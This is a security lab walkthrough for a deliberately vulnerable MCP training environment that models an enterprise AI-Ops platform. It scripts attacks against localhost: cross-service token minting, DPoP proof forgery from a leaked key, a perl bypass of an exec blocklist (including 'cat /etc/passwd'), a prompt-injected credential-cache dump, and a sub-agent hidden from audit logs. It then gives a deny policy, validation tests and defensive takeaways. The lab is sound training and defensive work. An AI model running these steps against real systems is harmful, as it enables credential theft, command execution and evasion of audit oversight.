# Campaign E: Enterprise AI-Ops Platform

*Transports: A, C | Lanes: 1, 2, 3, 4 | Labs: 5 | Time: ~90 min*

---

## Deployment Context

OpsAI Corp. runs an internal "AI-Ops" platform — AI agents that automate
infrastructure operations: deployment approvals, config changes, certificate
rotation, and post-incident remediation. The platform is trusted by three
engineering teams (platform, security, SRE) and has service accounts for
each.

The stack:

- A **shared identity provider (IdP)** issues tokens for all service accounts
  — platform agents, security agents, and SRE agents share a single OAuth2 tenant.
- Tokens are **DPoP-bound** (RFC 9449) to prevent replay from a different machine.
- Deployments are approved by an **AI governance gate** that checks whether
  a proposed deploy target is allowed.
- Commands run through an **execution engine** that blocks "dangerous" binaries
  via a keyword blocklist.
- **Sub-agents** handle specialized tasks and are loaded in-process via a shared
  SDK library.

The blast radius: compromise of any one service account — or the AI approval
gate — allows an attacker to push unauthorized deployments, run arbitrary
commands on production infrastructure, and forge audit log entries across all
three teams.

---

## Architecture

```
SRE engineer (Lane 1)
    │  authenticates via IdP → DPoP-bound token
    ▼
Platform Agent (Lane 2, delegated)
    │
    ├── platform.get_service_config      ← Lane 1: discovers IdP config
    ├── platform.mint_token              ← Lane 2: mints cross-service token
    ├── dpop.sign_proof                  ← Lane 3: signs DPoP proof
    ├── dpop.access_resource             ← Lane 3: accesses protected resource
    ├── exec.run_query                   ← Lane 2: runs command via engine
    └── chain.delegate_task             ← Lane 4: delegates to sub-agent SDK
           │
           └── SDK sub-agent (same process, Lane 4 / Transport C)
                  └── escalate_privilege / dump_cache → credential exposure
```

**The shared component:** All service accounts share one IdP. Token scope
pollution means a platform agent's token can mint credentials that include
the security team's scope. DPoP binding *should* prevent replay — but if
the private key leaks (or if proof validation is skipped), the DPoP
guarantee evaporates.

---

## Threat Model

| Step | Lab | Threat | Threat ID |
|------|-----|--------|-----------|
| 1 | `shared_idp_pollution_lab` | Platform agent mints a token that contains security team's scope — cross-service privilege escalation | MCP-T42 |
| 2 | `dpop_forgery_lab` | Leaked DPoP private key used to forge valid proof — token replay without the original machine | MCP-T43 |
| 3 | `blocklist_bypass_lab` | Exec engine blocks `bash`/`python` but not `perl`/`awk` — arbitrary command execution via alternate interpreter | MCP-T44 |
| 4 | `delegated_sdk_lab` | SRE agent delegates to platform agent via in-process SDK; credential cached in shared memory; injected `dump_cache` exposes it | MCP-T46 |
| 5 | `agent_sdk_chain_lab` | Platform sub-agent loaded in-process; `escalate_privilege` runs with platform agent's forwarded credential; sub-agent identity invisible in audit logs | MCP-T47 |

---

## Attack Walkthrough

### Step 0 — Setup

```bash
# Start camazotz (local Compose)
make up

# Set difficulty for initial exploration
curl -sf http://localhost:8080/config \
  -H 'Content-Type: application/json' \
  -d '{"difficulty": "easy"}'
```

---

### Step 1 — Shared IdP Pollution (`shared_idp_pollution_lab`)

The platform agent queries the IdP config and discovers all service accounts
share a single OAuth2 tenant. Token minting has no scope isolation.

```bash
# Discover service account config
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 1, "method": "tools/call",
    "params": {
      "name": "platform.get_service_config",
      "arguments": {
        "service_name": "platform-agent",
        "include_credentials": true
      }
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('service_config:', d.get('service_name'))
print('shared_idp_discovered:', d.get('_cross_service_access'))
print('other_services_visible:', d.get('shared_idp_hint','')[:120])
"

# Mint a token with security team's scope
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 2, "method": "tools/call",
    "params": {
      "name": "platform.mint_token",
      "arguments": {
        "service": "platform-agent",
        "requested_scope": "security-agent:admin"
      }
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('token_issued:', bool(d.get('token')))
print('cross_service_scope_granted:', d.get('_cross_service_scope'))
print('pollution_detected:', d.get('_scope_pollution'))
"
```

**What you see on easy:** The IdP issues a token that includes
`security-agent:admin` scope even though the requesting service is
`platform-agent`. Scope isolation across service accounts is not enforced
at minting time. On hard, the IdP checks the requesting service's allowlist
and rejects out-of-bounds scope.

---

### Step 2 — DPoP Forgery (`dpop_forgery_lab`)

A DPoP private key was left in the service config response. The attacker
uses it to forge a valid proof and replay the token from a different machine.

```bash
# Retrieve service info — note the leaked DPoP key material
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 3, "method": "tools/call",
    "params": {
      "name": "dpop.get_service_info",
      "arguments": {"service_id": "deploy-service"}
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('service_id:', d.get('service_id'))
print('dpop_key_hint:', d.get('dpop_key_hint','')[:80])
print('key_leaked:', d.get('_key_leaked'))
"

# Request access — will be denied (no DPoP)
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 4, "method": "tools/call",
    "params": {
      "name": "dpop.request_access",
      "arguments": {"service_id": "deploy-service", "token": "bearer-from-step1"}
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('status:', d.get('status'))   # denied — DPoP required
print('challenge:', d.get('_dpop_challenge','')[:40])
"

# Sign forged proof using the leaked key
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 5, "method": "tools/call",
    "params": {
      "name": "dpop.sign_proof",
      "arguments": {
        "service_id": "deploy-service",
        "key_material": "leaked-private-key-from-config",
        "htm": "GET",
        "htu": "http://deploy-service/api/deploy"
      }
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('proof_signed:', bool(d.get('dpop_proof')))
proof = d.get('dpop_proof','')
print('proof_preview:', proof[:60])
"

# Use forged proof to access the protected resource
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 6, "method": "tools/call",
    "params": {
      "name": "dpop.access_resource",
      "arguments": {
        "service_id": "deploy-service",
        "token": "bearer-from-step1",
        "dpop_proof": "<proof-from-above>",
        "resource": "deploy-api"
      }
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('access_granted:', d.get('access_granted'))
print('flag:', d.get('flag','')[:60])
print('forgery_succeeded:', d.get('_flags',{}).get('dpop_forgery_succeeded'))
"
```

**What you see on easy:** `access_granted: True` and the flag is returned.
The leaked key is enough to forge any DPoP proof for any resource. On hard,
the service validates the key fingerprint against a registered JWK set and
rejects proofs signed with a key that was not registered at token issuance
time.

---

### Step 3 — Blocklist Bypass (`blocklist_bypass_lab`)

The exec engine blocks `bash`, `python`, `ruby`, `node`, and `curl`. The
attacker uses `perl` (not on the blocklist) to run arbitrary commands.

```bash
# Check what's on the blocklist
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 7, "method": "tools/call",
    "params": {
      "name": "exec.list_approved",
      "arguments": {}
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('blocked:', d.get('blocked_interpreters'))
print('approved:', d.get('approved_interpreters'))
"

# Direct bash attempt — blocked
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 8, "method": "tools/call",
    "params": {
      "name": "exec.run_query",
      "arguments": {
        "query": "bash -c '\''id && cat /etc/passwd'\''"
      }
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('blocked:', d.get('_blocked'))
print('reason:', d.get('block_reason','')[:60])
"

# Perl bypass — not blocked
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 9, "method": "tools/call",
    "params": {
      "name": "exec.run_query",
      "arguments": {
        "query": "perl -e '\''system(\"id\");'\''"
      }
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('blocked:', d.get('_blocked'))
print('flag:', d.get('flag','')[:60])
print('output:', d.get('output','')[:80])
"
```

**What you see:** `blocked: False` for perl — the blocklist uses a keyword
substring match and `perl` is not listed. The output contains the flag.
On hard, the exec engine uses an allowlist (only `jq`, `awk`, `sed`) rather
than a blocklist, and the awk bypass requires safe-character URL encoding.

---

### Step 4 — In-Process Credential Cache Exposure (`delegated_sdk_lab`)

The SRE agent initializes the SDK with a delegated user token. A prompt-injected
`dump_cache` action exposes the token stored in shared process memory.

```bash
# Initialize SDK session — credential stored in-process
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 10, "method": "tools/call",
    "params": {
      "name": "sdk.initialize_session",
      "arguments": {
        "user_token": "sre-bearer-opsai",
        "scope": "read:infra"
      }
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('status:', d.get('status'))
print('credential_cached:', d.get('_flags',{}).get('credential_cached'))
"

# Confirm credential is in process memory
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 11, "method": "tools/call",
    "params": {
      "name": "sdk.inspect_cache",
      "arguments": {}
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('credential_present:', d.get('credential_present'))
print('cached_token_preview:', d.get('cached_credential','')[:30])
"

# Inject dump_cache action — exposes the cached credential
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 12, "method": "tools/call",
    "params": {
      "name": "sdk.invoke_action",
      "arguments": {
        "action": "dump_cache"
      }
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('cache_exposed:', d.get('_flags',{}).get('cache_exposed'))
print('cache_contents:', d.get('cache_contents','')[:60])
print('flag:', d.get('flag','')[:60])
"
```

**What you see:** The cached SRE token is returned in plain text alongside
the flag. On hard, `dump_cache` is removed from the SDK action allowlist —
the credential is still visible via `sdk.inspect_cache` but cannot be
extracted via the injection path.

---

### Step 5 — Agent SDK Chain Identity Dilution (`agent_sdk_chain_lab`)

The platform agent loads a sub-agent in-process and delegates
`escalate_privilege`. The sub-agent runs with the platform agent's forwarded
credential — no fresh token is issued — and its identity never appears in
the audit log.

```bash
# Load sub-agent in-process
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 13, "method": "tools/call",
    "params": {
      "name": "chain.load_agent",
      "arguments": {
        "agent_id": "deploy-subagent",
        "capability": "admin",
        "caller_token": "platform-bearer-opsai"
      }
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('status:', d.get('status'))
print('credential_forwarded:', d.get('_flags',{}).get('credential_forwarded'))
"

# Delegate escalate_privilege — runs with forwarded credential
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 14, "method": "tools/call",
    "params": {
      "name": "chain.delegate_task",
      "arguments": {
        "agent_id": "deploy-subagent",
        "task": "escalate_privilege"
      }
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('status:', d.get('status'))
print('flag:', d.get('flag','')[:60])
print('identity_diluted:', d.get('_flags',{}).get('identity_diluted'))
"

# Confirm sub-agent is invisible in audit log
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 15, "method": "tools/call",
    "params": {
      "name": "chain.read_audit_log",
      "arguments": {}
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
entries = d.get('entries', [])
actors = [e.get('actor','') for e in entries]
print('audit_actors:', actors)
print('deploy-subagent_visible:', any('deploy-subagent' in a for a in actors))
# Expected: deploy-subagent_visible: False
"
```

**What you see:** `escalate_privilege` succeeds. The audit log shows only
`agent-a (forwarded via deploy-subagent)` — the sub-agent identity is
invisible. On hard, the SDK task manifest blocks `escalate_privilege` and
only allows `process_data`, `list_resources`, `get_status`.

---

## Scanning with mcpnuke

```bash
# Baseline static scan — no tool invocations
mcpnuke --targets http://localhost:8080/mcp \
  --no-invoke \
  --profile profiles/camazotz.json \
  --verbose --json opsai-baseline.json

# Deep Claude scan with diff against baseline
mcpnuke --targets http://localhost:8080/mcp \
  --coverage 20 --claude \
  --claude-model claude-sonnet-4-20250514 \
  --profile profiles/camazotz.json \
  --diff-baseline opsai-baseline.json \
  --verbose --json opsai-claude.json
```

**Expected findings on easy:**

```
CRITICAL  MCP-T42  Shared IdP cross-service token pollution
CRITICAL  MCP-T43  DPoP key material exposed in service config — proof forgeable
HIGH      MCP-T44  Blocklist bypass via perl / awk interpreter
HIGH      MCP-T46  In-process SDK credential cache exposure (injected dump_cache)
HIGH      MCP-T47  Agent chain identity dilution — sub-agent invisible in audit logs
MEDIUM    MCP-T09  DPoP proof accepted without registered key fingerprint check
```

The mcpnuke DPoP enforcement check (`checks/dpop_enforcement.py`) will flag:
- Missing DPoP header probe: 200 without `DPoP` header
- Malformed DPoP JWT: 200 instead of 400
- Missing `htm`/`htu` fields: 200 instead of 400

---

## Defending with nullfield

```yaml
apiVersion: nullfield.io/v1alpha1
kind: NullfieldPolicy
metadata:
  name: enterprise-ai-ops-policy
  namespace: camazotz
spec:
  rules:
    # Block cross-service token minting — platform agent may only mint platform scope
    - action: DENY
      match:
        tool: "platform.mint_token"
        request:
          scope_contains: "security-agent"
      reason: "platform-agent may not mint tokens with security-agent scope."

    # Block cross-service token minting for any non-allowlisted scope
    - action: DENY
      match:
        tool: "platform.mint_token"
        request:
          scope_prefix_not_in: ["platform-agent:", "platform:read", "platform:write"]
      reason: "Token scope must be within the platform-agent service boundary."

    # Block URL-bearing arguments in DPoP tool calls (prevents SSRF via redirect)
    - action: SCOPE
      match:
        tool: "dpop.*"
      scope:
        request:
          blockRedirects: true
      reason: "DPoP tools must not follow redirects — prevents SSRF via open redirect."

    # Require DPoP proof on resource access calls
    - action: DENY
      match:
        tool: "dpop.access_resource"
        request:
          missing_field: "dpop_proof"
      reason: "Resource access requires a DPoP proof."

    # Block non-allowlisted exec interpreters
    - action: DENY
      match:
        tool: "exec.run_query"
        request:
          query_contains_pattern: "\\b(perl|awk|ruby|lua|php|node|tclsh|wish|expect)\\b"
      reason: "exec.run_query: only jq, sed, and approved data-processing tools are allowed."

    # Block SDK dump_cache action injection
    - action: DENY
      match:
        tool: "sdk.invoke_action"
        request:
          action: "dump_cache"
      reason: "dump_cache is not a permitted SDK action."

    # Require short-lived tokens — catch long-lived credential re-use
    - action: DENY
      match:
        tool: "sdk.initialize_session"
        request:
          token_ttl_greater_than: 3600
      reason: "SDK sessions require short-lived tokens (max 1 hour)."

    # Block SDK sub-agent task escalation
    - action: DENY
      match:
        tool: "chain.delegate_task"
        request:
          task: "escalate_privilege"
      reason: "Privilege escalation tasks may not be delegated to in-process sub-agents."

    # Require chain delegation to issue a fresh scoped token
    - action: HOLD
      match:
        tool: "chain.load_agent"
        request:
          missing_field: "fresh_token"
      reason: "Sub-agents must be initialized with a fresh scoped token, not a forwarded credential."
```

---

## Validation

```bash
# Full campaign loop (local Compose)
make campaign SCENARIO=enterprise-ai-ops

# NUC / k3s
K8S_HOST=<NODE_IP> make campaign SCENARIO=enterprise-ai-ops

# Manual — switch to hard difficulty and re-test each step
curl -sf http://localhost:8080/config -H 'Content-Type: application/json' \
  -d '{"difficulty": "hard"}'

# Test 1: Scope pollution blocked on hard
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"platform.mint_token","arguments":{"service":"platform-agent","requested_scope":"security-agent:admin"}}}' \
  | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('status:', d.get('status'))     # Expected: denied
print('scope_rejected:', d.get('_scope_rejected'))
"

# Test 2: DPoP forgery blocked on hard
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"dpop.access_resource","arguments":{"service_id":"deploy-service","token":"any","dpop_proof":"forged-proof","resource":"deploy-api"}}}' \
  | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('access_granted:', d.get('access_granted'))    # Expected: False
"

# Test 3: Blocklist bypass blocked on hard
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"exec.run_query","arguments":{"query":"perl -e '\''system(id);'\''"}}}' \
  | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('blocked:', d.get('_blocked'))    # Expected: True
"

# Test 4: dump_cache blocked on hard
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"sdk.invoke_action","arguments":{"action":"dump_cache"}}}' \
  | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('status:', d.get('status'))   # Expected: denied (hard allowlist blocks dump_cache)
"

# Test 5: escalate_privilege blocked on hard
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"chain.delegate_task","arguments":{"agent_id":"any","task":"escalate_privilege"}}}' \
  | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('status:', d.get('status'))   # Expected: denied (task manifest)
"
```

---

## Real-World Takeaways

- **A shared IdP without service-boundary scope enforcement is a privilege escalation surface.** When all service accounts share one OAuth2 tenant, a compromised low-privilege service account can mint tokens for any other service. The fix is explicit scope allowlists per service, enforced at the IdP — not just at the application layer.

- **DPoP token binding is only as strong as the key's confidentiality.** If the DPoP private key leaks (in a config response, an env var, a log line), the binding guarantee is gone. Key material should never appear in tool responses. mcpnuke's DPoP enforcement check detects the symptom; nullfield's `blockRedirects` limits the open redirect SSRF surface that often precedes key extraction.

- **Blocklists are inherently incomplete.** Every production blocklist was written by someone who was thinking about `bash` and `python`. `perl`, `awk`, `lua`, `tclsh`, and `expect` achieve the same RCE. An allowlist of approved data-processing tools (jq, sed, awk for read-only queries) is the correct primitive — not a list of banned interpreters.

- **In-process SDK calls have no credential boundary.** When an agent calls a sub-agent via an SDK library (Transport C), the caller's token is shared across both. There is no `Authorization: Bearer` header, no DPoP proof, no fresh issuance. The security assumption that token exchange implies authorization check is silently false. The fix is per-hop token exchange — even for in-process calls.

- **Audit logs that do not record sub-agent identities are not audit logs.** If your incident response says "platform-agent made 47 calls" but the sub-agent that made them is invisible, your SIEM data will attribute every action to the top-level caller. Chain identity must be recorded at each hop, not just at the entry point. This is a logging architecture decision, not just a policy one.
